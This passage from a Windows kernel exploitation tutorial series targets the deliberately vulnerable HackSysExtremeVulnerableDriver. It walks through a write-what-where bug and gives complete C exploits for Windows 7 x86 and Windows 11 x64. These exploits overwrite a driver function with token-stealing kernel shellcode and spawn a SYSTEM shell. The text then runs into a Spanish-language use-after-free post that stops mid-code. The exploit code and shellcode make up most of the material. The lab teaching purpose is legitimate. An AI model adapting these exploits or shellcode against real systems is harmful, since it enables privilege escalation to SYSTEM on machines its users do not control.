_In_ PIO_STACK_LOCATION IrpSp 138 ) 139 { 140 NTSTATUS Status = STATUS_UNSUCCESSFUL; 141 PWRITE_WHAT_WHERE UserWriteWhatWhere = NULL; 142 143 UNREFERENCED_PARAMETER(Irp); 144 PAGED_CODE(); 145 146 UserWriteWhatWhere = (PWRITE_WHAT_WHERE)IrpSp-\u0026gt;Parameters.DeviceIoControl.Type3InputBuffer; 147 148 if (UserWriteWhatWhere) 149 { 150 Status = TriggerArbitraryWrite(UserWriteWhatWhere); 151 } 152 153 return Status; 154 } However, our input will be casted into a PWRITE_WHAT_WHERE object (technically a pointer to a WRITE_WHAT_WHERE structure).\nLet\u0026rsquo;s take a look at this structure (ArbitraryWrite.h).\n62 typedef struct _WRITE_WHAT_WHERE 63 { 64 PULONG_PTR What; 65 PULONG_PTR Where; 66 } WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE; We see two pointers to LONG integers, nothing too crazy.\nHaving understood the structure layout, let\u0026rsquo;s look at the TriggerArbitraryWrite() function that takes our input as this structure type.\n63 NTSTATUS 64 TriggerArbitraryWrite( 65 _In_ PWRITE_WHAT_WHERE UserWriteWhatWhere 66 ) 67 { 68 PULONG_PTR What = NULL; 69 PULONG_PTR Where = NULL; 70 NTSTATUS Status = STATUS_SUCCESS; 71 72 PAGED_CODE(); 73 74 __try 75 { 76 // 77 // Verify if the buffer resides in user mode 78 // 79 80 ProbeForRead((PVOID)UserWriteWhatWhere, sizeof(WRITE_WHAT_WHERE), (ULONG)__alignof(UCHAR)); 81 82 What = UserWriteWhatWhere-\u0026gt;What; 83 Where = UserWriteWhatWhere-\u0026gt;Where; 84 85 DbgPrint(\u0026#34;[+] UserWriteWhatWhere: 0x%p\\n\u0026#34;, UserWriteWhatWhere); 86 DbgPrint(\u0026#34;[+] WRITE_WHAT_WHERE Size: 0x%X\\n\u0026#34;, sizeof(WRITE_WHAT_WHERE)); 87 DbgPrint(\u0026#34;[+] UserWriteWhatWhere-\u0026gt;What: 0x%p\\n\u0026#34;, What); 88 DbgPrint(\u0026#34;[+] UserWriteWhatWhere-\u0026gt;Where: 0x%p\\n\u0026#34;, Where); 89 90 #ifdef SECURE 91 // 92 // Secure Note: This is secure because the developer is properly validating if address 93 // pointed by \u0026#39;Where\u0026#39; and \u0026#39;What\u0026#39; value resides in User mode by calling ProbeForRead()/ 94 // ProbeForWrite() routine before performing the write operation 95 // 96 97 ProbeForRead((PVOID)What, sizeof(PULONG_PTR), (ULONG)__alignof(UCHAR)); 98 ProbeForWrite((PVOID)Where, sizeof(PULONG_PTR), (ULONG)__alignof(UCHAR)); 99 100 *(Where) = *(What); 101 #else 102 DbgPrint(\u0026#34;[+] Triggering Arbitrary Write\\n\u0026#34;); 103 104 // 105 // Vulnerability Note: This is a vanilla Arbitrary Memory Overwrite vulnerability 106 // because the developer is writing the value pointed by \u0026#39;What\u0026#39; to memory location 107 // pointed by \u0026#39;Where\u0026#39; without properly validating if the values pointed by \u0026#39;Where\u0026#39; 108 // and \u0026#39;What\u0026#39; resides in User mode 109 // 110 111 *(Where) = *(What); 112 #endif 113 } 114 __except (EXCEPTION_EXECUTE_HANDLER) 115 { 116 Status = GetExceptionCode(); 117 DbgPrint(\u0026#34;[-] Exception Code: 0x%X\\n\u0026#34;, Status); 118 } 119 120 // 121 // There is one more hidden vulnerability. Find it out. 122 // 123 124 return Status; 125 } As with all blocks of code, let\u0026rsquo;s take this section by section.\n80 ProbeForRead((PVOID)UserWriteWhatWhere, sizeof(WRITE_WHAT_WHERE), (ULONG)__alignof(UCHAR)); 81 82 What = UserWriteWhatWhere-\u0026gt;What; 83 Where = UserWriteWhatWhere-\u0026gt;Where; 84 85 DbgPrint(\u0026#34;[+] UserWriteWhatWhere: 0x%p\\n\u0026#34;, UserWriteWhatWhere); 86 DbgPrint(\u0026#34;[+] WRITE_WHAT_WHERE Size: 0x%X\\n\u0026#34;, sizeof(WRITE_WHAT_WHERE)); 87 DbgPrint(\u0026#34;[+] UserWriteWhatWhere-\u0026gt;What: 0x%p\\n\u0026#34;, What); 88 DbgPrint(\u0026#34;[+] UserWriteWhatWhere-\u0026gt;Where: 0x%p\\n\u0026#34;, Where); First, we see that local variables of type PULONG_PTR are assigned from our structure.\nFollowing this code, we drop into the #else statement since we\u0026rsquo;re targeting the vulnerable driver.\n111 *(Where) = *(What); Here we see that whatever is stored in our What pointer will be written to the Where pointer. To be more specific we\u0026rsquo;re dereferencing the Where pointer and assigning the value stored in the memory location pointed to by What.\nIn theory we can write whatever we want wherever we want. This means we do not need to worry too much about where to store our shellcode since we have access to the entire operating system since we\u0026rsquo;re running under the context of the kernel.\nOur approach will be to leak the base address of HEVD and determine a function we can overwrite to execute our shellcode. Once our shellcode is placed in said function we can simply call it. In addition, we should not have to worry about SMEP since we will be executing a function that is meant to be in kernel space.\nThis is a seems easy enough\u0026hellip; so let\u0026rsquo;s exploit it!\nExploitation # Seeing that this vulnerability was rather basic, I decided to write a PoC immediatley. Since we can write anywhere we want, we can simply overwrite any function!\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; #define ARW_HELPER_OBJECTS 3 #define MAX_OBJECT_COUNT 65535 #define IOCTL(Function) CTL_CODE (FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS) #define HEVD_IOCTL_ARBITRARY_WRITE IOCTL(0x802) #define HEVD_IOCTL_DELETE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX IOCTL(0x81B) /* Structure used by Write-What-Where */ typedef struct _WRITE_WHAT_WHERE { PULONG_PTR What; PULONG_PTR Where; } WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE; /* typdef signature for ZwQuerySystemInformation */ typedef NTSTATUS (__stdcall *ZWQUERYSYSTEMINFORMATION)( SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength ); /* Structures used by KernelGetModuleBase */ typedef struct _SYSTEM_MODULE_ENTRY { HANDLE Section; PVOID MappedBase; PVOID ImageBase; ULONG ImageSize; ULONG Flags; USHORT LoadOrderIndex; USHORT InitOrderIndex; USHORT LoadCount; USHORT OffsetToFileName; UCHAR FullPathName[256]; } SYSTEM_MODULE_ENTRY, *PSYSTEM_MODULE_ENTRY; typedef struct _SYSTEM_MODULE_INFORMATION { ULONG Count; SYSTEM_MODULE_ENTRY Module[1]; } SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION; /* KernelGetModuleBase(): Function used to obtain kernel module address */ PVOID KernelGetModuleBase(PCHAR pcModuleName) { HANDLE hModule = NULL; PVOID pSystemInfo = NULL; PVOID pModule = NULL; ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation = NULL; NTSTATUS status = 0xc000009a; // STATUS_INSUFFICIENT_RESOURCES SYSTEM_INFORMATION_CLASS SystemModuleInformation = 0x0B; ULONG SystemInfoSize = 0; hModule = LoadLibraryA(\u0026#34;ntdll.dll\u0026#34;); if (hModule == NULL) { printf(\u0026#34;[-] Failed to load ntdll.dll\\n\u0026#34;); return NULL; } ZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)GetProcAddress(hModule, \u0026#34;ZwQuerySystemInformation\u0026#34;); if (ZwQuerySystemInformation == NULL) { printf(\u0026#34;[-] Failed to find ZwQuerySystemInformation within ntdll.dll\u0026#34;); CloseHandle(hModule); return NULL; } /* Obtain the size of the requested information */ status = ZwQuerySystemInformation(SystemModuleInformation, NULL, SystemInfoSize, \u0026amp;SystemInfoSize); if (SystemInfoSize == 0) { printf(\u0026#34;[*] Failed to get size of SystemInformation\\n\u0026#34;); CloseHandle(hModule); return NULL; } pSystemInfo = (PSYSTEM_MODULE_INFORMATION)malloc(SystemInfoSize); if (pSystemInfo == NULL) { printf(\u0026#34;[-] Failed to allocate buffer for SystemInformation\\n\u0026#34;); CloseHandle(hModule); return NULL; } memset(pSystemInfo, \u0026#39;\\0\u0026#39;, SystemInfoSize); /* Obtain the SystemModuleInformation */ status = ZwQuerySystemInformation(SystemModuleInformation, pSystemInfo, SystemInfoSize, \u0026amp;SystemInfoSize); PSYSTEM_MODULE_ENTRY pSysModule = ((PSYSTEM_MODULE_INFORMATION)(pSystemInfo))-\u0026gt;Module; for (unsigned long i = 0; i \u0026lt; ((PSYSTEM_MODULE_INFORMATION)(pSystemInfo))-\u0026gt;Count; i++) { if (StrStrA(pSysModule[i].FullPathName, pcModuleName) != NULL) { pModule = pSysModule[i].ImageBase; } } if (hModule != NULL) { CloseHandle(hModule); } return pModule; } /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } /* WriteBytes(): This function triggers the Write-What-Where vulnerability */ void WriteBytes(HANDLE hHEVD, ULONG ulWhat, ULONG ulWhere) { DWORD dwBytesReturned; WRITE_WHAT_WHERE www = { 0 }; www.Where = (PULONG)ulWhere; www.What = \u0026amp;ulWhat; printf(\u0026#34;\\t[*] Writing 0x%p to 0x%p\\n\u0026#34;, *www.What, www.Where); DeviceIoControl(hHEVD, HEVD_IOCTL_ARBITRARY_WRITE, \u0026amp;www, sizeof(WRITE_WHAT_WHERE), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); return; } /* Exploit(): Arbitrary write */ int Exploit(HANDLE hHEVD) { DWORD i = 0; DWORD dwShellcodeLength = 0; DWORD dwBytesReturned = 0; ULONG target = 0; ULONG ulRawBytes = 0; PVOID pHEVDBase = NULL; CHAR cRawBytes[60] = { 0 }; CHAR cShellcode[]= \u0026#34;\\x90\\x90\\x90\u0026#34; // nops // sickle -p windows/x86/kernel_token_stealer -f c -m pinpoint \u0026#34;\\x60\u0026#34; // pushal \u0026#34;\\x31\\xc0\u0026#34; // xor eax, eax \u0026#34;\\x64\\x8b\\x80\\x24\\x01\\x00\\x00\u0026#34; // mov eax, dword ptr fs:[eax + 0x124] \u0026#34;\\x8b\\x40\\x50\u0026#34; // mov eax, dword ptr [eax + 0x50] \u0026#34;\\x89\\xc1\u0026#34; // mov ecx, eax \u0026#34;\\xba\\x04\\x00\\x00\\x00\u0026#34; // mov edx, 4 \u0026#34;\\x8b\\x80\\xb8\\x00\\x00\\x00\u0026#34; // mov eax, dword ptr [eax + 0xb8] \u0026#34;\\x2d\\xb8\\x00\\x00\\x00\u0026#34; // sub eax, 0xb8 \u0026#34;\\x39\\x90\\xb4\\x00\\x00\\x00\u0026#34; // cmp dword ptr [eax + 0xb4], edx \u0026#34;\\x75\\xed\u0026#34; // jne 0x1014 \u0026#34;\\x8b\\x90\\xf8\\x00\\x00\\x00\u0026#34; // mov edx, dword ptr [eax + 0xf8] \u0026#34;\\x89\\x91\\xf8\\x00\\x00\\x00\u0026#34; // mov dword ptr [ecx + 0xf8], edx \u0026#34;\\x61\u0026#34; // popal /* return code (sickle -a x86 -m asm_shell) */ \u0026#34;\\x31\\xc0\u0026#34; // xor eax, eax \u0026#34;\\xc2\\x08\\x00\u0026#34;; // ret 0x8 dwShellcodeLength = 60; if ((dwShellcodeLength % 4) != 0) { printf(\u0026#34;[-] Shellcode must by divisible by 4\\n\u0026#34;); return -1; } pHEVDBase = KernelGetModuleBase(\u0026#34;HEVD\u0026#34;); if (pHEVDBase == NULL) { printf(\u0026#34;[-] Failed to obtain the base address of HEVD\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Obtained HEVD base address: 0x%p\\n\u0026#34;, pHEVDBase); target = (ULONG)pHEVDBase + 0x448f2; printf(\u0026#34;[*] Overwriting memory @{DeleteArbitraryReadWriteHelperObjecNonPagedPoolNxIoctlHandler}\\n\u0026#34;); /* This is a quick for loop I whipped up to write our shellcode. The way this works is the buffer is converted into a little endian ASCII address (e.g 0x41424344 -\u0026gt; 0x44434241) then we convert the ASCII address to an unsigned long integer (4 bytes) to be written via the Write-What-Where vulnerability. Each iteration we increment the target address by 4 (32bit address) to point to the next address, we also increment the pointer to the shellcode array by 4 (we can only write 4 bytes at a time). */ for (i = 0; i \u0026lt; dwShellcodeLength; i += 4) { sprintf(cRawBytes, \u0026#34;0x%02x%02x%02x%02x\u0026#34;, ((uint32_t)cShellcode[i+3] \u0026amp; 0xff), ((uint32_t)cShellcode[i+2] \u0026amp; 0xff), ((uint32_t)cShellcode[i+1] \u0026amp; 0xff), ((uint32_t)cShellcode[i+0] \u0026amp; 0xff)); ulRawBytes = strtoul(cRawBytes, NULL, 16); WriteBytes(hHEVD, ulRawBytes, target); memset(cRawBytes, \u0026#39;\\0\u0026#39;, 60); target += 4; } printf(\u0026#34;[+] Calling DeleteArbitraryReadWriteHelperObjecNonPagedPoolNx\\n\u0026#34;); DeviceIoControl(hHEVD, HEVD_IOCTL_DELETE_ARW_HELPER_OBJECT_NON_PAGED_POOL_NX, NULL, 0, NULL, 0x00, \u0026amp;dwBytesReturned, NULL); return CheckWin(); } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } if (Exploit(hHEVD) == 0) { printf(\u0026#34;[+] Exploitation successful, enjoy your shell!\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } else { printf(\u0026#34;[-] Exploitation failed, run again\\n\u0026#34;); return -1; } if (hHEVD != INVALID_HANDLE_VALUE) { CloseHandle(hHEVD); } } Successful exploitation shown below :)\nGreat work exploiting a Write-What-Where vulnerability! As a challenge to you, before reading the next section go ahead and attempt exploitation against any version of Windows 11 (x64).\nIf you manage to get code execution, ask yourself what are the main changes? Are there any? Even if you don\u0026rsquo;t get it before the next section, I\u0026rsquo;m sure you will walk away with a valuable set of skills to further enhance your approach during exploitation :)\nWindows 11 (x64) # Having completed this challenge rather quickly in Windows 7 (x86), let\u0026rsquo;s try exploitation in Windows 11 (x64).\nReverse Engineering # Looking at the vulnerable function in Ghidra it\u0026rsquo;s easy to spot the arbitrary write using the pseudo code.\nThe next thing we need to do is identify what the members are of the _WRITE_WHAT_WHERE structure, in this case it\u0026rsquo;s easy to identify since we see the members being accessed are being stored in unsigned long pointers. However, since we have symbols, we can easily locate this just to be sure in the Data Type Manager.\nKnowing this information we can start to generate a PoC to interact with this function.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; #define ARBITRARY_WRITE 0x22200b /* Structure used by Write-What-Where */ typedef struct _WRITE_WHAT_WHERE { uint64_t *ullpWhat; uint64_t *ullpWhere; } WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE; LPVOID GetKernelModuleBase(PCHAR pKernelModule) { char pcDriver[1024] = { 0 }; LPVOID lpvTargetDriver = NULL; LPVOID *lpvDrivers = NULL; DWORD dwCB = 0; DWORD dwDrivers = 0; DWORD i = 0; EnumDeviceDrivers(NULL, dwCB, \u0026amp;dwCB); if (dwCB \u0026lt;= 0) return NULL; lpvDrivers = (LPVOID *)malloc(dwCB * sizeof(LPVOID)); if (lpvDrivers == NULL) return NULL; if (EnumDeviceDrivers(lpvDrivers, dwCB, \u0026amp;dwCB)) { dwDrivers = dwCB / sizeof(LPVOID); for (i = 0; i \u0026lt; dwDrivers; i++) if (GetDeviceDriverBaseNameA(lpvDrivers[i], pcDriver, sizeof(pcDriver))) if (StrStrA(pcDriver, pKernelModule) != NULL) lpvTargetDriver = lpvDrivers[i]; } free(lpvDrivers); return lpvTargetDriver; } void WriteBytes(HANDLE hHEVD, uint64_t ullWhat, uint64_t ullWhere) { DWORD dwBytesReturned = 0; WRITE_WHAT_WHERE www = { 0 }; www.ullpWhere = (uint64_t *)ullWhere; www.ullpWhat = \u0026amp;ullWhat; printf(\u0026#34;\\t[*] Writing 0x%p to 0x%p\\n\u0026#34;, *www.ullpWhat, www.ullpWhere); DeviceIoControl(hHEVD, ARBITRARY_WRITE, \u0026amp;www, sizeof(WRITE_WHAT_WHERE), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); return; } int Exploit(HANDLE hHEVD) { LPVOID pHEVDBase = NULL; DWORD i = 0; DWORD dwShellcodeLength = 0; DWORD dwBytesReturned = 0; uint64_t ullTarget = 0; uint64_t ullRawBytes = 0; CHAR cRawBytes[60] = { 0 }; CHAR shellcode[]=\u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x42\u0026#34;; dwShellcodeLength = 8; if ((dwShellcodeLength % 8) != 0) { printf(\u0026#34;[-] Shellcode must be divisible by 8\\n\u0026#34;); return -1; } pHEVDBase = GetKernelModuleBase(\u0026#34;HEVD\u0026#34;); if (pHEVDBase == NULL) { printf(\u0026#34;[-] Failed to obtain the base address of HEVD\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Obtained the base address of HEVD: 0x%p\\n\u0026#34;, pHEVDBase); ullTarget = (uint64_t)pHEVDBase + 0x85b14; printf(\u0026#34;[*] Overwriting memory @{DeleteArbitraryReadWriteHelperObjecNonPagedPoolNxIoctlHandler}\\n\u0026#34;); for (i = 0; i \u0026lt; dwShellcodeLength; i += sizeof(uint64_t)) { sprintf(cRawBytes, \u0026#34;0x%02x%02x%02x%02x%02x%02x%02x%02x\u0026#34;, ((uint32_t)shellcode[i+7] \u0026amp; 0xff), ((uint32_t)shellcode[i+6] \u0026amp; 0xff), ((uint32_t)shellcode[i+5] \u0026amp; 0xff), ((uint32_t)shellcode[i+4] \u0026amp; 0xff), ((uint32_t)shellcode[i+3] \u0026amp; 0xff), ((uint32_t)shellcode[i+2] \u0026amp; 0xff), ((uint32_t)shellcode[i+1] \u0026amp; 0xff), ((uint32_t)shellcode[i+0] \u0026amp; 0xff)); ullRawBytes = strtoull(cRawBytes, NULL, 16); WriteBytes(hHEVD, ullRawBytes, ullTarget); memset(cRawBytes, \u0026#39;\\0\u0026#39;, 60); ullTarget += sizeof(uint64_t); } } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } Exploit(hHEVD); if (hHEVD != NULL) CloseHandle(hHEVD); return 0; } Let\u0026rsquo;s test this.\nOnce sent we can see we have successfully triggered the arbitrary write :)\nExploitation # After some tinkering I was able to write a fully functioning exploit that can be seen below:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; #define ARBITRARY_WRITE 0x22200b #define TARGET_FUNCTION 0x22206f /* Structure used by Write-What-Where */ typedef struct _WRITE_WHAT_WHERE { uint64_t *ullpWhat; uint64_t *ullpWhere; } WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE; /* GetKernelModuleBase(): Function used to obtain kernel module address */ LPVOID GetKernelModuleBase(PCHAR pKernelModule) { char pcDriver[1024] = { 0 }; LPVOID lpvTargetDriver = NULL; LPVOID *lpvDrivers = NULL; DWORD dwCB = 0; DWORD dwDrivers = 0; DWORD i = 0; EnumDeviceDrivers(NULL, dwCB, \u0026amp;dwCB); if (dwCB \u0026lt;= 0) return NULL; lpvDrivers = (LPVOID *)malloc(dwCB * sizeof(LPVOID)); if (lpvDrivers == NULL) return NULL; if (EnumDeviceDrivers(lpvDrivers, dwCB, \u0026amp;dwCB)) { dwDrivers = dwCB / sizeof(LPVOID); for (i = 0; i \u0026lt; dwDrivers; i++) if (GetDeviceDriverBaseNameA(lpvDrivers[i], pcDriver, sizeof(pcDriver))) if (StrStrA(pcDriver, pKernelModule) != NULL) lpvTargetDriver = lpvDrivers[i]; } free(lpvDrivers); return lpvTargetDriver; } /* WriteBytes(): This function triggers the Write-What-Where vulnerability */ void WriteBytes(HANDLE hHEVD, uint64_t ullWhat, uint64_t ullWhere) { DWORD dwBytesReturned = 0; WRITE_WHAT_WHERE www = { 0 }; www.ullpWhere = (uint64_t *)ullWhere; www.ullpWhat = \u0026amp;ullWhat; printf(\u0026#34;\\t[*] Writing 0x%p to 0x%p\\n\u0026#34;, *www.ullpWhat, www.ullpWhere); DeviceIoControl(hHEVD, ARBITRARY_WRITE, \u0026amp;www, sizeof(WRITE_WHAT_WHERE), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); return; } /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } /* Exploit(): Arbitrary Write */ int Exploit(HANDLE hHEVD) { LPVOID pHEVDBase = NULL; DWORD i = 0; DWORD dwShellcodeLength = 0; DWORD dwBytesReturned = 0; uint64_t ullTarget = 0; uint64_t ullRawBytes = 0; CHAR cRawBytes[60] = { 0 }; CHAR shellcode[]= /* ALIGNMENT */ \u0026#34;\\x90\\x90\u0026#34; /* python3 sickle.py -p windows/x64/kernel_token_stealer -f c -m pinpoint (58 bytes) */ \u0026#34;\\x65\\x48\\xa1\\x88\\x01\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34; // movabs rax, qword ptr gs:[0x188] \u0026#34;\\x48\\x8b\\x80\\xb8\\x00\\x00\\x00\u0026#34; // mov rax, qword ptr [rax + 0xb8] \u0026#34;\\x48\\x89\\xc1\u0026#34; // mov rcx, rax \u0026#34;\\xb2\\x04\u0026#34; // mov dl, 4 \u0026#34;\\x48\\x8b\\x80\\x48\\x04\\x00\\x00\u0026#34; // mov rax, qword ptr [rax + 0x448] \u0026#34;\\x48\\x2d\\x48\\x04\\x00\\x00\u0026#34; // sub rax, 0x448 \u0026#34;\\x38\\x90\\x40\\x04\\x00\\x00\u0026#34; // cmp byte ptr [rax + 0x440], dl \u0026#34;\\x75\\xeb\u0026#34; // jne 0x1017 \u0026#34;\\x48\\x8b\\x90\\xb8\\x04\\x00\\x00\u0026#34; // mov rdx, qword ptr [rax + 0x4b8] \u0026#34;\\x48\\x89\\x91\\xb8\\x04\\x00\\x00\u0026#34; // mov qword ptr [rcx + 0x4b8], rdx /* KERNEL RECOVERY */ \u0026#34;\\x48\\x31\\xc0\u0026#34; /* xor rax, rax */ \u0026#34;\\xc3\u0026#34;; /* ret */ dwShellcodeLength = 64; if ((dwShellcodeLength % 8) != 0) { printf(\u0026#34;[-] Shellcode must be divisible by 8\\n\u0026#34;); return -1; } pHEVDBase = GetKernelModuleBase(\u0026#34;HEVD\u0026#34;); if (pHEVDBase == NULL) { printf(\u0026#34;[-] Failed to obtain the base address of HEVD\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Obtained the base address of HEVD: 0x%p\\n\u0026#34;, pHEVDBase); ullTarget = (uint64_t)pHEVDBase + 0x85b14; printf(\u0026#34;[*] Overwriting memory @{DeleteArbitraryReadWriteHelperObjecNonPagedPoolNxIoctlHandler}\\n\u0026#34;); /* Same operation as the Windows 7 exploit just ported to work on 64bit addressing */ for (i = 0; i \u0026lt; dwShellcodeLength; i += sizeof(uint64_t)) { sprintf(cRawBytes, \u0026#34;0x%02x%02x%02x%02x%02x%02x%02x%02x\u0026#34;, ((uint32_t)shellcode[i+7] \u0026amp; 0xff), ((uint32_t)shellcode[i+6] \u0026amp; 0xff), ((uint32_t)shellcode[i+5] \u0026amp; 0xff), ((uint32_t)shellcode[i+4] \u0026amp; 0xff), ((uint32_t)shellcode[i+3] \u0026amp; 0xff), ((uint32_t)shellcode[i+2] \u0026amp; 0xff), ((uint32_t)shellcode[i+1] \u0026amp; 0xff), ((uint32_t)shellcode[i+0] \u0026amp; 0xff)); ullRawBytes = strtoull(cRawBytes, NULL, 16); WriteBytes(hHEVD, ullRawBytes, ullTarget); memset(cRawBytes, \u0026#39;\\0\u0026#39;, 60); ullTarget += sizeof(uint64_t); } printf(\u0026#34;[*] Shellcode buffer written!!\\n\u0026#34;); printf(\u0026#34;[*] Calling DeleteArbitraryReadWriteHelperObjecNonPagedPoolNxIoctlHandler\\n\u0026#34;); DeviceIoControl(hHEVD, TARGET_FUNCTION, NULL, 0x00, NULL, 0x00, \u0026amp;dwBytesReturned, NULL); return CheckWin(); } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == INVALID_HANDLE_VALUE) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } if (Exploit(hHEVD) == 0) { printf(\u0026#34;[+] Exploitation successful, enjoy the shell!!\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } else { printf(\u0026#34;[*] Exploitation failed, run again\\n\u0026#34;); } if (hHEVD != NULL) CloseHandle(hHEVD); return 0; } Once sent, we achieve code execution!\n","date":"4 January 2025","externalUrl":null,"permalink":"/posts/0x04-writing-what-where-in-the-kernel/","section":"Posts","summary":"","title":"0x04 - Introduction to Windows Kernel Write What Where Vulnerabilities","type":"posts"},{"content":"Habiendo aprovechado el UaF en Windows 7 (x86), hemos obtenido una idea sólida de cómo funciona esta vulnerabilidad, es hora de intentar esto en Windows 11 (x64).\nEs importante tener en cuenta que, aunque confirmamos que Violet Phosphorus funciona contra Windows 11 24H2, durante el resto de la serie usaré Windows 11 (x64) - 10.0.22000 N/A Build 22000, simplemente porque esta es la versión con la que probé las vulnerabilidades durante el desarrollo inicial.\nPuede adaptar cualquiera de estos tutoriales a la última versión de Windows; sin embargo, como se indicó anteriormente, es probable que te encuentres con nuevos controles de seguridad introducidos en la última versión del OS.\nTable of Contents # Ingeniería Inversa Dando un Paso Atrás Kernel Heap Fengshui (Alex Ionescu) Piscinas Uso de Cloro para Piscinas Regresando a VulnDev Explotación Recursos Ingeniería Inversa # Ya sabemos mucho sobre esta vulnerabilidad ya que la aprovechamos anteriormente en Windows 7 (x86), sin embargo, hay algunas cosas que debemos obtener antes de poder continuar. Como anteriormente usamos el código, ahora cambiaremos nuestro enfoque en el uso de Ghidra. Para crear nuestro exploit necesitaremos la siguiente información:\nEl tamaño del objeto (para aprovechar la UaF) IOCTL códigos Esta información se puede obtener fácilmente ya que sabemos dónde buscar. El tamaño del objeto en x64 ha cambiado de 0x58 bytes a 0x60 bytes como se muestra aquí.\nLos códigos IOCTL los podemos obtener de el IrpDeviceIoCtlHandler(), los que nos importan son los siguientes:\nFunction IOCTL Code AllocateUaFObjectNonPagedPoolIoctlHandler 0x222013 UseUaFObjectNonPagedPoolIoctlHandler 0x222017 FreeUaFObjectNonPagedPoolIoctlHandler 0x22201b AllocateFakeObjectNonPagedPoolIoctlHandler 0x22201f Con eso tenemos todo lo que necesitamos para crear un PoC.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; // IOCTL Codes #define ALLOCATE_REAL_OBJ 0x222013 #define CALL_FUNC_PTR 0x222017 #define FREE_OBJ 0x22201b #define ALLOCATE_FAKE_OBJ 0x22201f // Allocated object size #define OBJ_SIZE 0x60 void sendIoctl(HANDLE hHEVD, DWORD dIoctl, CHAR *pBuffer, DWORD dBuffer) { DWORD bytesReturned = 0; DeviceIoControl(hHEVD, dIoctl, pBuffer, dBuffer, NULL, 0x00, \u0026amp;bytesReturned, NULL); return; } char *allocate_buffer() { char *buffer = malloc(OBJ_SIZE); if (buffer != NULL) { memset(buffer, 0x41, OBJ_SIZE); } return buffer; } int main() { HANDLE hHEVD = NULL; char *evilBuffer = NULL; hHEVD = 